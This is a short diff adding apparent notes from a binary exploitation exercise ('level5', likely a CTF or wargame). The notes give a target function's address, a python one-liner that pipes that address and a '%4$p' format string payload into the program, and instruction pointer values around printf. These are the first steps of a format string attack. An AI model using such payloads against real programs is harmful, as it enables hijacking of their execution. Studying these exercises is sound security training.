@@ -1,0 +1,4 @@
+080484a4 \xa4\x84\x04\x08 -> address of o
+python -c 'print "\xa4\x84\x04\x08" + "%4$p"' | ./level5
+eip 0x80484f3 before printf
+eip 0x80484f8 after printf
